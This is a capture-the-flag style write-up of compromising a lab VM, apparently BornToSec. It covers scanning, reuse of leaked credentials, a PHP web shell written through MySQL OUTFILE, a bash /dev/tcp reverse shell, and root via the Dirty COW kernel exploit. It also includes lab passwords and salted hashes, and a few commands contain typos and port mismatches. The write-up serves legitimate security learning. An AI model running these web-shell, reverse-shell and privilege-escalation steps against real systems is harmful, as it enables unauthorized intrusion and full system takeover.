
## Write-up 1 : Dirty Cow

```bash
ip -a >> 192.168.188.129
```



From Kali we scan using nmap ping sweep to find target in our subnet since the machine is not advertizing its ip 

```bash
nmap -sn 192.168.188.0/24
```

```bash 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-25 09:22 -0400
Nmap scan report for 192.168.188.1
Host is up (0.00027s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.188.2
Host is up (0.00018s latency).
MAC Address: 00:50:56:EF:A3:31 (VMware)
Nmap scan report for 192.168.188.128
Host is up (0.00019s latency).
MAC Address: 00:0C:29:18:9B:C6 (VMware)
Nmap scan report for 192.168.188.254
Host is up (0.00018s latency).
MAC Address: 00:50:56:F5:0C:2C (VMware)
Nmap scan report for 192.168.188.129
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 4.43 seconds

```


eleminating infra IPs .1 , .2 amd .254 left us with 2 ips in the subnet .128 and .129 since .129 have no lantency and no mac adresse since we cant scan our own interface 192.168.188.128 is the target IP 

**Port scanning our target :**

```bash 
nmap -sV -sC -p- -T4 192.168.188.128
```

**output : **
```bash
nmap -sV -sC -p- -T4 192.168.188.128  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-25 12:40 -0400
Nmap scan report for 192.168.188.128
Host is up (0.00069s latency).
Not shown: 65529 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hack me if you can
|_http-server-header: Apache/2.2.22 (Ubuntu)
143/tcp open  imap     Dovecot imapd
|_ssl-date: 2026-04-25T15:06:04+00:00; -1h35m10s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
|_imap-capabilities: more have Pre-login ENABLE post-login IMAP4rev1 capabilities LOGIN-REFERRALS listed OK LOGINDISABLEDA0001 LITERAL+ SASL-IR IDLE ID STARTTLS
443/tcp open  ssl/http Apache httpd 2.2.22
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_http-title: 404 Not Found
|_ssl-date: 2026-04-25T15:06:04+00:00; -1h35m10s from scanner time.
993/tcp open  ssl/imap Dovecot imapd
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
|_imap-capabilities: more AUTH=PLAINA0001 ENABLE have IMAP4rev1 post-login LOGIN-REFERRALS listed OK capabilities Pre-login SASL-IR IDLE ID LITERAL+
|_ssl-date: 2026-04-25T15:06:04+00:00; -1h35m10s from scanner time.
MAC Address: 00:0C:29:18:9B:C6 (VMware)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h35m10s, deviation: 0s, median: -1h35m10s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.75 second
```

**nmap scan breakdown :**

| Port | Service             |                                                        |
| ---- | ------------------- | ------------------------------------------------------ |
| 21   | vsftpd 2.0.8+       | FTP. Anonymous already refused due to chroot misconfig |
| 22   | OpenSSH 5.9p1       | SSH                                                    |
| 80   | Apache 2.2.22       |                                                        |
| 143  | Dovecot IMAP        | Mail server                                            |
| 443  | Apache 2.2.22 (SSL) |                                                        |
| 993  | Dovecot IMAPS       | Encrypted IMAP                                         |

running gobuster on the IP (ssl) give the following output : 

```bash
gobuster dir -u https://192.168.188.128/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.188.128/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
forum                (Status: 301) [Size: 320] [--> https://192.168.188.128/forum/]
webmail              (Status: 301) [Size: 322] [--> https://192.168.188.128/webmail/]
phpmyadmin           (Status: 301) [Size: 325] [--> https://192.168.188.128/phpmyadmin/]

```

==***phpmyadmin, webmail and forum are all accessible on the browser***==



#### 1. targeting forum first 

looking around the forum we find a list of users registered in the forum 
[https://192.168.188.128/forum/](https://192.168.188.128/forum/index.php?mode=user)

we found user named **lmezard** posted a login problem post contain a leaked password in log shared 

```text
user: lmezard
pass: !q\]Ej?*5K5cy*AJ 
```

after accessing user account in the forum looking into his profile exposes email, which also have same password in webmail 
https://192.168.188.128/webmail

```text
email: laurie@borntosec.net
password : !q\]Ej?*5K5cy*AJ
```

accessing the email and checking sent email we found the following email sent to laurie 
```text


Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.

```

contain db access in the form of **username/password** which logged us successfuly into phpmyadmin 



checking the db we found the following 

```sql 
	@@version 	@@secure_file_priv 	current_user() 	user() 	@@version_compile_os
5.5.44-0ubuntu0.12.04.1 	NULL	root@localhost 	root@localhost 	debian-linux-gnu
```

since secure file priv is NULL we have the right to write and read what ever file we need from the DB, checking users passwords we find the following users each with their password hashed as SHA-1 + salt 

trying to hash the following passwords using hashcat 

```text
ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0:516d551c28 a12e059d6f4c21c6c5586283c8ecb2b65618ed0a:0dc1b302a2 d30668b779542d60c4cde29e7170148198b1623f:4453866797 f8562b53084d60efa4208fa50d1ef753ef18e089:d2dd56c4ed 0171e7dbcbf4bd21a732fa859ea98a2950b4f8aa:1e5365dc90 f10b3271bf523f12ebd58ef8581c851991bf0d4b:4c4bf49d7c
```

```bash
hashcat -m 110 hashes.txt /usr/share/wordlists/rockyou.txt
```

0 password cracked, but it's confirmed using limzard password that the hashing follow the following format **password + 10 salt" 

```bash
echo -n '!q\]Ej?*5K5cy*AJ1e5365dc90' | sha1sum
0171e7dbcbf4bd21a732fa859ea98a2950b4f8aa  -

```

==i abandoned this path, check up later !===

since myusql have privilege to write file let's get an rce since apache is on **/var/www** and open a reverse shell, writing the file as follow in phpmyadmin :

```sql
SELECT '<?php system($_REQUEST["c"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/r.php';
```

testing it as follow : 

```bash
curl -k 'https://192.168.188.128/forum/templates_c/r.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

opening a reverse shell : 

```bash
nv -nvlp 1337
```

```bash 
curl -k -G 'https://192.168.188.128/forum/templates_c/r.php' --data-urlencode 'c=bash -c "bash -i >& /dev/tcp/192.168.188.129/4444 0>&1"'
```


opened successfuly we stabilize the shell 

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```


i will use linpeas to find a priovilige escalation exploit 

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python -m http.server 8000 
```

in target machine 

```bash 
wget http://192.168.188.128:8000/linpeas.sh
chmod +x linpeas.sh
./linspeas.sh
```

running linpeas resulted in founding almost 25 CVEs in kernel level, i picked **CVE-2016-5195** aka dirty cow executed as follow :


```bash
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
python3 -m http.server 8000
```

```bash
wget http://192.168.188.129:8000/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

dirty cow PoC prompt for setting password to the new root , 

```bash 
su - toor 
id -> uuid: 0(toor)
```

how dirty COW poc work :
	- **Read** the existing `/etc/passwd` content.
	-  **Find** an existing line  typically the first user  and pick its byte offset.
	- **Construct** a replacement line of the same length (this is critical — the exploit overwrites bytes in place, doesn't insert or delete). The line is padded or trimmed to match: `toor:tozdrkUwnrPL6:0:0:pwned:/root:/bin/bash` plus newline padding to fit the original line's exact byte length.
	- **Hash** the password the user provides (`root1337`) using DES crypt, the legacy format that `/etc/passwd` accepts inline (when there's no shadow indirection  `x` means "see /etc/shadow," but a plain hash means "use this directly").
	- **mmap** `/etc/passwd` read-only, MAP_PRIVATE, at the offset of the line to replace.
	- **Spawn two threads:**
		- Thread A: loop calling `pwrite(/proc/self/mem, ...)` to write the new line to the mapping.
		- Thread B: loop calling `madvise(MADV_DONTNEED)` on the mapping.
	- **Wait.** The threads race for some seconds-to-minutes. Eventually the kernel's bug fires, and the write lands in the page cache backing `/etc/passwd`.
	- **Verify** by reading `/etc/passwd` — if the new line is there, race won.

linux then sees the user with UID 0 as root because it relies on /etc/passwd as a source of truth 
